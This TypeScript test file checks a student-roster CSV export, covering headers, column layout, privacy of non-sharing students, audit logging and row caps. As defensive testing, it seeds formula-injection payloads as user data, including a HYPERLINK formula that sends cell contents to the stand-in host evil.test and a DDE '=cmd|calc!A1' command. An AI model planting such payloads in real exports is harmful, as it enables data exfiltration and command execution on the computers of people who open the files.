import { randomUUID } from 'node:crypto';
import { and, eq } from 'drizzle-orm';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { schema } from '@atlas/db';
import { APPLICATION_STATUSES } from '@atlas/types';
import { parseCsv } from '../src/lib/csv-parse.js';
import { EXPORT_COLUMNS } from '../src/lib/export-csv.js';
import { ADMIN_BASE, createHarness, testDatabaseUrl, type Harness } from './support.js';

const HOSTILE_NAMES = [
  '=HYPERLINK("http://evil.test/?q="&A1,"click")',
  '+1+1',
  '-2+3',
  '@SUM(1+1)',
  '\t=cmd|calc!A1',
  '\r=cmd',
  'Doe, "Jane"\nJr', // legitimate awkward text: quotes, comma, newline
  'Zoë Ünïcode ✓',
] as const;

describe.skipIf(!testDatabaseUrl)('admin-service CSV export', () => {
  let h: Harness;
  let orgId: string;
  let ownerId: string;
  let headers: Record<string, string>;
  const tag = randomUUID().slice(0, 8);
  const sharingNames = new Map<string, string>(); // email -> platform name

  const exportCsv = (query = '', org = orgId, hdrs = headers) =>
    h.app.inject({ method: 'GET', url: `${ADMIN_BASE}/${org}/export.csv${query}`, headers: hdrs });

  const records = (body: string) => parseCsv(body, { maxRecords: 100_000 });
  const exportAudits = async (org = orgId) =>
    h.handle.db
      .select()
      .from(schema.auditLogs)
      .where(
        and(
          eq(schema.auditLogs.organizationId, org),
          eq(schema.auditLogs.action, 'admin.students.export'),
        ),
      );

  beforeAll(async () => {
    h = await createHarness();
    orgId = await h.seedOrganization('university');
    const owner = await h.seedUser();
    ownerId = owner.userId;
    await h.addMember(orgId, ownerId, 'owner');
    headers = await h.authHeaders(ownerId);

    // Members whose platform names are attacker-chosen text.
    for (const [index, fullName] of HOSTILE_NAMES.entries()) {
      const user = await h.seedUser({ email: `export-${index}-${tag}@example.test`, fullName });
      await h.addMember(orgId, user.userId, 'student');
      await h.addStudent(orgId, user.userId, {
        program: index === 0 ? '=2+2' : 'Plain Program',
        graduationYear: 2026,
      });
      sharingNames.set(user.email, fullName);
    }

    // Leading characters in the *email* and *program* columns too.
    for (const [prefix, program] of [
      ['+', '-1'],
      ['-', '@home'],
      ['=', '\tTabbed'],
    ] as const) {
      const user = await h.seedUser({
        email: `${prefix}lead-${tag}@example.test`,
        fullName: 'Lead Char',
      });
      await h.addStudent(orgId, user.userId, { program, graduationYear: 2027 });
    }

    // One with a real summary, one roster-only with private activity that must stay private.
    const active = await h.seedUser({
      email: `active-${tag}@example.test`,
      fullName: 'Active Student',
    });
    await h.addMember(orgId, active.userId, 'student');
    await h.addStudent(orgId, active.userId, { program: 'Economics', graduationYear: 2025 });
    await h.seedResume(active.userId, { atsScore: 77.5 });
    await h.seedApplication(active.userId, { status: 'submitted', organizationId: orgId });
    await h.seedApplication(active.userId, { status: 'offer', organizationId: orgId });
    await h.seedApplication(active.userId, { status: 'offer', organizationId: orgId });

    const hidden = await h.seedUser({
      email: `hidden-${tag}@example.test`,
      fullName: 'Hidden Person',
    });
    await h.addStudent(orgId, hidden.userId);
    await h.seedResume(hidden.userId, { atsScore: 95 });
    await h.seedApplication(hidden.userId, { status: 'offer', organizationId: orgId });
  });

  afterAll(async () => {
    await h.close();
  });

  it('serves a CSV attachment that is never cached or sniffed', async () => {
    const res = await exportCsv();
    expect(res.statusCode).toBe(200);
    expect(res.headers['content-type']).toBe('text/csv; charset=utf-8');
    expect(res.headers['content-disposition']).toMatch(
      /^attachment; filename="students-\d{4}-\d{2}-\d{2}\.csv"$/,
    );
    expect(res.headers['cache-control']).toBe('no-store');
    expect(res.headers['x-content-type-options']).toBe('nosniff');
  });

  it('starts with a UTF-8 BOM by default and omits it on request', async () => {
    expect((await exportCsv()).body.startsWith('﻿email,')).toBe(true);
    const plain = await exportCsv('?bom=false');
    expect(plain.body.startsWith('email,')).toBe(true);
    expect(plain.body.charCodeAt(0)).not.toBe(0xfeff);
  });

  it('writes the documented columns, one row per student, CRLF-terminated', async () => {
    const res = await exportCsv('?bom=false');
    expect(res.body.endsWith('\r\n')).toBe(true);
    const rows = records(res.body);
    expect(rows[0]).toEqual([...EXPORT_COLUMNS]);
    expect(EXPORT_COLUMNS.slice(9)).toEqual(
      APPLICATION_STATUSES.map((status) => `applications_${status}`),
    );
    expect(rows).toHaveLength(1 + HOSTILE_NAMES.length + 3 + 2);
    for (const row of rows) expect(row).toHaveLength(EXPORT_COLUMNS.length);
  });

  it('exports the application-status summary for sharing students and nothing for the others', async () => {
    const rows = records((await exportCsv('?bom=false')).body);
    const column = (name: (typeof EXPORT_COLUMNS)[number]) => EXPORT_COLUMNS.indexOf(name);
    const byEmail = new Map(rows.slice(1).map((row) => [row[column('email')], row]));

    const active = byEmail.get(`active-${tag}@example.test`)!;
    expect(active[column('full_name')]).toBe('Active Student');
    expect(active[column('program')]).toBe('Economics');
    expect(active[column('graduation_year')]).toBe('2025');
    expect(active[column('sharing_enabled')]).toBe('true');
    expect(active[column('has_resume')]).toBe('true');
    expect(active[column('latest_ats_score')]).toBe('77.5');
    expect(active[column('applications_total')]).toBe('3');
    expect(active[column('applications_submitted')]).toBe('1');
    expect(active[column('applications_offer')]).toBe('2');
    expect(active[column('applications_draft')]).toBe('0');

    // Not sharing: identity, and a blank (unknown) summary rather than 0 / false.
    const hidden = byEmail.get(`hidden-${tag}@example.test`)!;
    expect(hidden[column('full_name')]).toBe('');
    expect(hidden[column('sharing_enabled')]).toBe('false');
    for (const name of EXPORT_COLUMNS.slice(6)) expect(hidden[column(name)], name).toBe('');
  });

  describe('formula injection', () => {
    it('prefixes every cell that starts with = + - @ TAB or CR with a single quote', async () => {
      const res = await exportCsv('?bom=false');
      const rows = records(res.body);
      const dangerous = /^[=+\-@\t\r]/;

      for (const row of rows) {
        for (const cell of row) {
          expect(dangerous.test(cell), JSON.stringify(cell)).toBe(false);
        }
      }

      const fullNames = rows.slice(1).map((row) => row[EXPORT_COLUMNS.indexOf('full_name')]);
      expect(fullNames).toContain(`'=HYPERLINK("http://evil.test/?q="&A1,"click")`);
      expect(fullNames).toContain("'+1+1");
      expect(fullNames).toContain("'-2+3");
      expect(fullNames).toContain("'@SUM(1+1)");
      expect(fullNames).toContain("'\t=cmd|calc!A1");
      expect(fullNames).toContain("'\r=cmd");
    });

    it('neutralizes the email and program columns as well', async () => {
      const rows = records((await exportCsv('?bom=false')).body).slice(1);
      const emails = rows.map((row) => row[EXPORT_COLUMNS.indexOf('email')]);
      for (const prefix of ['+', '-', '=']) {
        expect(emails).toContain(`'${prefix}lead-${tag}@example.test`);
      }
      const programs = rows.map((row) => row[EXPORT_COLUMNS.indexOf('program')]);
      expect(programs).toEqual(expect.arrayContaining(["'=2+2", "'-1", "'@home", "'\tTabbed"]));
    });

    it('leaves the raw bytes quoted and escaped so the neutralized cell is a single, inert field', async () => {
      const { body } = await exportCsv('?bom=false');
      // quote → doubled, field wrapped in quotes, neutralizing apostrophe first.
      expect(body).toContain(`"'=HYPERLINK(""http://evil.test/?q=""&A1,""click"")"`);
      // No line begins with a raw formula trigger either.
      for (const line of body.split('\r\n')) expect(/^[=+\-@]/.test(line), line).toBe(false);
    });

    it('still escapes legitimate commas, quotes, newlines and non-ASCII text exactly', async () => {
      const rows = records((await exportCsv('?bom=false')).body).slice(1);
      const fullNames = rows.map((row) => row[EXPORT_COLUMNS.indexOf('full_name')]);
      expect(fullNames).toContain('Doe, "Jane"\nJr');
      expect(fullNames).toContain('Zoë Ünïcode ✓');
    });

    it('changes only the export: stored data is untouched', async () => {
      const stored = await h.handle.db
        .select({ program: schema.students.department })
        .from(schema.students)
        .where(eq(schema.students.organizationId, orgId));
      expect(stored.map((row) => row.program)).toContain('=2+2');
    });
  });

  it('does not leak private content', async () => {
    const res = await exportCsv();
    for (const secret of ['CONFIDENTIAL', 'parsed', 'cover_letter', 'Hidden Person', 'user_id']) {
      expect(res.body, secret).not.toContain(secret);
    }
  });

  it('applies the same filters as the list endpoint', async () => {
    const rows = records((await exportCsv(`?bom=false&search=active-${tag}`)).body);
    expect(rows).toHaveLength(2);
    const offers = records((await exportCsv('?bom=false&application_status=offer')).body);
    expect(offers.slice(1).map((row) => row[0])).toEqual([`active-${tag}@example.test`]);
    expect((await exportCsv('?application_status=bogus')).statusCode).toBe(400);
    expect((await exportCsv('?bom=perhaps')).statusCode).toBe(400);
  });

  describe('audit trail', () => {
    it('writes one entry per export with the exact row count and no personal data', async () => {
      const org = await h.seedOrganization('university');
      const admin = await h.seedUser();
      await h.addMember(org, admin.userId, 'admin');
      const user = await h.seedUser({
        email: `audited-${tag}@example.test`,
        fullName: 'Audited Person',
      });
      await h.addStudent(org, user.userId);
      const adminHeaders = await h.authHeaders(admin.userId);

      expect(await exportAudits(org)).toHaveLength(0);
      const res = await exportCsv('?search=audited-secret-term', org, adminHeaders);
      expect(res.statusCode).toBe(200);
      const filtered = await exportCsv('?bom=false', org, adminHeaders);
      expect(records(filtered.body)).toHaveLength(2);

      const audits = await exportAudits(org);
      expect(audits).toHaveLength(2);
      const [searched, plain] = audits
        .sort(
          (a, b) =>
            (a.metadata.filters as string[]).length - (b.metadata.filters as string[]).length,
        )
        .reverse();
      expect(plain).toMatchObject({
        organizationId: org,
        actorUserId: admin.userId,
        resourceType: 'student_roster',
        resourceId: org,
        metadata: { format: 'csv', row_count: 1, filters: [] },
      });
      expect(searched?.metadata).toEqual({ format: 'csv', row_count: 0, filters: ['search'] });
      const serialized = JSON.stringify(audits);
      for (const personal of [user.email, 'Audited Person', 'audited-secret-term', '@']) {
        expect(serialized, personal).not.toContain(personal);
      }
    });

    it('does not write an entry for a refused request', async () => {
      const org = await h.seedOrganization('university');
      const member = await h.seedUser();
      await h.addMember(org, member.userId, 'member');
      const res = await exportCsv('', org, await h.authHeaders(member.userId));
      expect(res.statusCode).toBe(403);
      expect(await exportAudits(org)).toHaveLength(0);
    });
  });

  describe('row cap', () => {
    it('refuses an export over the cap (413) without auditing or sending data, and allows exactly the cap', async () => {
      const capped = await createHarness({ limits: { exportMaxRows: 3 } });
      try {
        const org = await capped.seedOrganization('university');
        const owner = await capped.seedUser();
        await capped.addMember(org, owner.userId, 'owner');
        const ownerHeaders = await capped.authHeaders(owner.userId);
        for (let index = 0; index < 3; index += 1) {
          const user = await capped.seedUser();
          await capped.addStudent(org, user.userId);
        }

        const atCap = await capped.app.inject({
          method: 'GET',
          url: `${ADMIN_BASE}/${org}/export.csv`,
          headers: ownerHeaders,
        });
        expect(atCap.statusCode).toBe(200);

        const extra = await capped.seedUser();
        await capped.addStudent(org, extra.userId);
        const over = await capped.app.inject({
          method: 'GET',
          url: `${ADMIN_BASE}/${org}/export.csv`,
          headers: ownerHeaders,
        });
        expect(over.statusCode).toBe(413);
        expect(over.json().error).toMatchObject({
          code: 'PAYLOAD_TOO_LARGE',
          details: { max_rows: 3 },
        });
        expect(over.body).not.toContain('@');

        const audits = await capped.handle.db
          .select()
          .from(schema.auditLogs)
          .where(
            and(
              eq(schema.auditLogs.organizationId, org),
              eq(schema.auditLogs.action, 'admin.students.export'),
            ),
          );
        expect(audits).toHaveLength(1); // only the successful one
      } finally {
        await capped.close();
      }
    });

    it('pages through more rows than one database page holds', async () => {
      // 1,000 is the internal page size; a roster of 1,010 needs two pages and must come back whole and unduplicated.
      const org = await h.seedOrganization('university');
      const owner = await h.seedUser();
      await h.addMember(org, owner.userId, 'owner');
      await h.handle.sql`
        insert into auth.users (id, instance_id, aud, role, email, email_confirmed_at, raw_app_meta_data, raw_user_meta_data, created_at, updated_at)
        select gen_random_uuid(), '00000000-0000-0000-0000-000000000000', 'authenticated', 'authenticated',
               'bulk-' || n || '-' || ${tag} || '@example.test', now(), '{"provider":"email"}'::jsonb, '{}'::jsonb, now(), now()
        from generate_series(1, 1010) as n
      `;
      const bulk = await h.handle.sql<{ user_id: string }[]>`
        select user_id from public.users where email like ${`bulk-%-${tag}@example.test`}
      `;
      await h.handle.sql`
        insert into students (organization_id, user_id, created_at)
        select ${org}, user_id, now() - (row_number() over ())::int * interval '1 millisecond'
        from public.users where email like ${`bulk-%-${tag}@example.test`}
      `;
      try {
        const res = await exportCsv('?bom=false', org, await h.authHeaders(owner.userId));
        expect(res.statusCode).toBe(200);
        const rows = records(res.body).slice(1);
        expect(rows).toHaveLength(1010);
        expect(new Set(rows.map((row) => row[0])).size).toBe(1010);
      } finally {
        await h.handle
          .sql`delete from auth.users where id in ${h.handle.sql(bulk.map((row) => row.user_id))}`;
        await h.handle.db.delete(schema.auditLogs).where(eq(schema.auditLogs.organizationId, org));
      }
    });
  });
});
